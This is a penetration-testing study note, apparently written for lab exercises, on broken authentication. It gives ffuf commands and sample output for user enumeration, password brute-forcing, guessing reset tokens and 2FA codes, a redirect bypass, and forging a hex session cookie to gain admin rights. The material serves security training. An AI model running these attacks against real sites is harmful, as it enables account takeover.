---
Primary_category: "[[WEB ATTACKS]]"
title: "BROKEN AUTHENTICATION"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB ATTACKS]]

#### *Theory*

***Broken Authentication*** referes to weaknesses in an application's authentication mechanisms that allows an attacker to impersonate legitimate users, bypass authentication controls or gain unauthorized access to accounts

These vulnerabilities commonly arise from →

- ***Weak Password Policies***

- ***Improper Session Management***

- ***Insufficient Protection against Brute-force Attacks***

- ***Insecure Password Recovery Mechanisms***

- ***Incorrect Validation of Authentication Tokens***

---

#### *User Enumeration*

This usually occurs on login/register features where the given webapp responds differently depending on whether the user exists or not

So, let's imagine that we are facing a web application and it has a login feature, when trying to authenticate with a non-existing user, we get the following error message

```bash
Unknown user.
```

![[BROKEN AUTHENTICATION-20260919171717523.webp|450]]

> ***Zoom in***

In the other hand, we get the message below with an existing user account

> ***Incorrectly authentication for an existing user*** ⬇️

```bash
Invalid credentials.
```

![[BROKEN AUTHENTICATION-20260919172426965.webp|450]]

> ***Zoom in***

Knowing that the web application response differs in both cases, we can just send authentication requests and filter out the unwanted response

First, analyze the authentication request to know the *POST* parameters, so we can replicate it with ***[ffuf](https://github.com/ffuf/ffuf)***

![[BROKEN AUTHENTICATION-20260919172942974.webp|450]]

> ***Zoom in***

Then, proceed as follows:

```bash
ffuf -v -t 200 -w '<WORDLIST>' -X POST -d 'username=FUZZ&password=value' -H 'Content-Type: application/x-www-form-urlencoded' -u '<TARGET_URL>' -fr '<ERROR_MESSAGE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> ffuf -v -t 200 -w '/usr/share/seclist/Usernames/xato-net-10-million-usernames.txt' -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u 'http://154.57.164.64:31356/index.php' -fr 'Invalid username or password'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> [Status: 200, Size: 3271, Words: 754, Lines: 103, Duration: 310ms]
>       * FUZZ: random6996
> ```
>

---

#### *Brute-Forcing Passwords*

Users usually set weak passwords to their accounts, so once we know valid user accounts, we can try to brute-force passwords

First, it's always recommended to see if we can gather the web application's password policy either on the login or register pages

Applications usually indicate which requirements must the given password meet when registering a new account

So, we can try to register a new account in order to find out the password requirements

![[BROKEN AUTHENTICATION-20260919174753981.webp|450]]

> ***Zoom in***

With this in mind, we can filter out from our wordlist any string that does not meet the given policy requirements before starting the brute-force process

> ***Requirements***

- ***At least one uppercase***
- ***At least one lowercase***
- ***At least one digit***
- ***Minimun length of X characters***

Given the requirements above, we can proceed as follows →

###### *Wordlist Customization*

```bash
awk 'length($0) >= <LENGTH> && /[a-z]/ && /[A-Z]/ && /[0-9]/' <WORDLIST> > <OUTPUT_WORDLIST>
```

> [!DANGER]- *e.g.*
>
> ```bash
> awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' /usr/share/wordlists/rockyou.txt > custom.lst
> ```
>

###### *Fuzzing*

As with ***[[#User Enumeration]]***, perform an authentication request to see which response the client receives

![[BROKEN AUTHENTICATION-20260919175731833.webp|450]]

> ***Zoom in***

Therefore, we must filter out the **`Invalid username or password.`** string to see any different response during the bruteforce process

```bash
ffuf -v -t 200 -w '<WORDLIST>' -X POST -d 'username=<VALID_USER>&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u '<TARGET>' -fr '<ERROR_MESSAGE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> ffuf -v -t 200 -w './custom.lst' -X POST -d 'username=admin&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -u 'http://154.57.164.64:31356/index.php' -fr 'Invalid username or password'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
> | URL | http://154.57.164.82:30674/index.php
> | --> | /admin.php
>     * FUZZ: Ramirez120992
> ```
>

---

#### *Brute-Forcing Password Reset Tokens*

Most of web application with user register/login features implement a password recovery functionality in case a user forgets their password

This functionality usually relies on a one-time reset token, which is transmitted to the user via *SMS* or *email*

Then the user authenticates to the web application using this token in order to reset the password

Therefore, a weak password-reset token may be brute-forced or predicted by an attacker to gain unauthorized access and takeover the victim's account

For instance, a web application has the password-reset feature below:

![[BROKEN AUTHENTICATION-20260919181036614.webp|450]]

> ***Zoom in***

We can enter any random username and receive the following response:

![[BROKEN AUTHENTICATION-20260919181137967.webp|450]]

> ***Zoom in***

By accessing the link above, we land into the password-reset page. However, we receive an error message as we don't have a valid token in order to reset the password of an existing user

In addition, we know how the *token* is sent to the web application

```bash
http://<TARGET>/reset_password.php?token=<TOKEN>
```

It would be interesting to know the token structure as well. To do so, we can simply try to sign up on the web app and subsequently request a password-reset for our user

We will receive an email containing a valid *URL* with the given token

```bash
Hello,
<SNIP>
1. Click on the following link to reset your password: Click
2. If the above link doesn't work, copy and paste the following URL into your web browser: http://weak_reset.htb/reset_password.php?token=7351
<SNIP>
```

Given that the token in question consists of only a 4-digit number, we can try to brute-force valid tokens

But first, let's see which response we get when providing a wrong token to the password-reset feature

![[BROKEN AUTHENTICATION-20260919182722769.webp|450]]

> ***Zoom in***

```bash
The provided token is invalid
```

So now we can request another password-reset for an existing account whose password we don't know and filter out the string above before starting the ***[[FUZZING|Fuzzing]]*** process

![[BROKEN AUTHENTICATION-20260919182337981.webp|450]]

> ***Zoom in***

```bash
ffuf -v -t 200 -w <( seq -w 0 9999 ) -u '<TARGET>?token=FUZZ' -fr '<ERROR_MESSAGE>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> ffuf -v -t 200 -w <( seq -w 0 9999 ) -u 'http://154.57.164.82:32746/reset_password.php?token=FUZZ' -fr 'The provided token is invalid' 
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> [Status: 200, Size: 2920, Words: 596, Lines: 92, Duration: 56ms]
> | URL | http://154.57.164.82:32746/reset_password.php?token=4145
>     * FUZZ: 4145
> ```
>

---

#### *Brute-Forcing 2FA Codes*

After getting valid credentials through *phising*, we try to authenticate to the web application but *2FA* is enabled, so the web app is asking us for a *2FA* code

![[BROKEN AUTHENTICATION-20260919184529693.webp|450]]

> ***Zoom in***

Having failed several times, we do not see the web app requesting any token other than the initial one

Therefore, knowing that it's a 4-digit *OTP*, we can try to guess it through brute-force

First, analyze the *POST* request to see how the code is sent once submitted

![[BROKEN AUTHENTICATION-20260919185043321.webp|450]]

> ***Zoom in***

```bash
otp=<CODE>
```

Furthermore, we see that we receive the **`Invalid 2FA Code.`** error message. So, as with previous cases, we can filter out the latter before starting the fuzzing process

We have to take into account that a cookie is set after first authentication, so we have to pass the cookie to the fuzzing tool as well

```bash
ffuf -v -w <( seq -w 0 9999 ) -X POST --data '<PARAMETER>=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b '<COOKIE>' -u '<TARGET>' -fr '<ERROR_MESSAGE>' 
```

> [!DANGER]- *e.g.*
>
> ```bash
> ffuf -v -t 200 -w <( seq -w 0 9999 ) -X POST --data 'otp=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'PHPSESSID=gksgiar60ee2ef9mhpcds10gbm' -u 'http://154.57.164.82:30537/2fa.php' -fr 'Invalid 2FA Code.'
> ```
>

> [!TLDR]- *Expected Output*
>
> ```bash
> <SNIP>
> [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 42ms]
> | URL | http://154.57.164.82:30537/2fa.php
> | --> | admin.php
>     * FUZZ: 7725
> <SNIP>
> ```
>

---

#### *Authentication Bypass via Direct Access*

There are web application that do not properly verify whether a request is authenticated or not

Therefore, an attacker could bypass the authentication mechanism by simply requesting the *"protected"* resources directly

For instance, let's imagine that we've already performed fuzzing on the web app we're evaluating and found the resources below:

```bash
/login.php
/admin.php
```

If try to access **`admin.php`**, we recieve a *302 Found* response and get redirected to **`login.php`**

However, we discovered that the content of **`admin.php`** is sent in the response body even though we received a *302 Found*

![[BROKEN AUTHENTICATION-20260919194616414.webp|450]]

> ***Zoom in***

So, the web application probably uses the following code to verify whether a user is authenticated:

```php
if(!$_SESSION['active']) {
    header("Location: index.php");
}
```

Whereas, the correct way would be this →

```php
if(!$_SESSION['active']) {
    header("Location: index.php");
	exit;
}
```

To be able to access **`admin.php`** directly from the browser, simply intercept the request with an *HTTP Proxy* - such as *Burpsuite* - and replace the *302 Found* with *200 OK*

![[BROKEN AUTHENTICATION-20260919195226915.webp|450]]

> ***Zoom in***

![[BROKEN AUTHENTICATION-20260919195342395.webp|450]]

> ***Zoom in***

![[BROKEN AUTHENTICATION-20260919195406805.webp|450]]

> ***Zoom in***

And that's it!

---

#### *Attacking Session Cookies/Tokens*

A web application may set weak and predictable cookie tokens after successful authentications

For instance, we might face a web application that sets the cookie below after an authentication

![[BROKEN AUTHENTICATION-20260919202248959.webp|450]]

> ***Zoom in***

Since it's 4 digits long, we can perform brute-force to guess other existing tokens, so we can takeover any existing account

Other scenario would be a web app that generates a cookie session based on certain data such as the username in question and a role

![[BROKEN AUTHENTICATION-20260919202728241.webp|450]]

> ***Zoom in***

It might seem random at first, but it definitely is not. In this case, it appears to be an hexadecimal string

Decoding it gives us the following →

```bash
echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -ps -r
```

> [!TLDR]- *Output*
>
> ```bash
> user=htb-stdnt;role=user
> ```
>

So, what if we replace the *user* role with the *admin* role?

```bash
echo 'user=htb-stdnt;role=admin' | xxd -plain
```

> [!TLDR]- *Output*
>
> ```bash
> 757365723d6874622d7374646e743b726f6c653d61646d696e0a
> ```
>

![[BROKEN AUTHENTICATION-20260919203244046.webp|450]]

> ***Zoom in***

We receive a different response!